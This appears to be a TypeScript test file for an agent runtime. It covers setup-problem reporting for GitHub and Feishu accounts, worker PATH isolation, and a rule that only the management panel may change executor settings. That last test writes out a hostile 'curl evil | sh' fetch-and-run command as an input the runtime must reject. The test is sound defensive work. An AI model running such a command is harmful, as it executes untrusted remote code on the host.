it('reports each setup problem where the operator fixes it, and checks the agent CLI the way worker shells run it', async () => {
  const needs = async (place: string, code: string, values: Record<string, string>, accounts: Accounts = {}) => {
    const next = await restart({}, accounts)
    await next.ready
    expect(next.setupProblem).toMatchObject({ place, code, values })
  }
  answers[`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":false}\n'
  await needs('github', 'repositoryReadOnly', { account: 'agent-bot', repository: 'acme/widgets' })
  answers[`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
  // The agent CLI runs in the workers' environment: without the shims on PATH.
  // Adapted: commands run through the host's SubprocessRuntime.run(argv, options), where upstream's ran through DSH's spawn.
  const check = h.subprocess.run.mock.calls.map(([command]) => command).find(argv => argv.includes(AGENT()))!
  expect(check[0]).toBe('env')
  expect(check[1]!.startsWith('PATH=')).toBe(true)
  expect(check[1]!.slice('PATH='.length).split(':')).not.toContain(join(h.directory, 'worker-bin'))
  const valid = { ...answers }
  // git older than 2.32 ignores GIT_CONFIG_GLOBAL and reads the operator's configuration.
  answers = { ...valid, [HELPERS]: 'file:/home/me/.gitconfig\0!gh auth git-credential\0' }
  await needs('deployment', 'gitTooOld', {})
  await needs('github', 'repositoryUnset', {}, { github: { repository: '' } })
  // A broken Feishu bot leaves Feishu out and says why; GitHub work goes on.
  answers = { ...valid, [`${BOT()} config strict-mode`]: 'strict-mode: off (source: profile)' }
  const next = await restart()
  await next.ready
  expect(next.configured()).toBe(true)
  expect(next.deployment.feishu).toBeUndefined()
  expect(next.feishuProblem).toMatchObject({ place: 'feishu', code: 'feishuUserIdentity', values: { mode: 'off' } })
})

it('reports a failure to write the agent environment as environmentFailed and leaves this process\'s environment as it was', async () => {
  await runtime.stop()
  // The shim directory cannot be made: a file has its name.
  rmSync(join(h.directory, 'worker-bin'), { recursive: true, force: true })
  writeFileSync(join(h.directory, 'worker-bin'), '')
  const environment = { ...process.env }
  const next = await restart()
  await next.ready
  expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'environmentFailed',
    values: { output: expect.stringContaining('EEXIST') } })
  expect(process.env).toEqual(environment)
})

// Adapted: the restarted Runtime runs only the terminal's Source until the case registers Feishu's and GitHub's, as upstream's.
it('checks only the account a Source save changes, so a problem setup has elsewhere does not refuse it', async () => {
  answers = { ...answers, [`${BOT()} config strict-mode`]: 'strict-mode: off (source: profile)' }
  const next = await restart({}, {}, noSources)
  await next.ready
  expect(next.feishuProblem).toMatchObject({ code: 'feishuUserIdentity' })
  next.sources.register(feishuSource.kind); next.sources.register(githubSource.kind)
  answers[`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
  const github = next.settings.block('source:github')
  const value = github.value as { enabled: boolean; config: Record<string, unknown> }
  expect(await next.settings.save('source:github', { ...value, config: { ...value.config, cli: OTHER() } }, github.revision, 'panel'))
    .toMatchObject({ saved: true, restarting: true })
})

it('lets only the panel change the execution environment, since it decides what runs as a shell command and which CLIs workers reach', async () => {
  const executor = () => runtime.store.settings().executor
  const save = (value: Record<string, unknown>, origin: SettingsOrigin) => runtime.settings.save('executor', { ...executor(), ...value }, runtime.store.blockRevision('executor'), origin)
  for (const origin of ['tool', 'sync'] as const) {
    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
  }
  expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
  expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
  expectTypeOf(runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
  expectTypeOf(runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
})
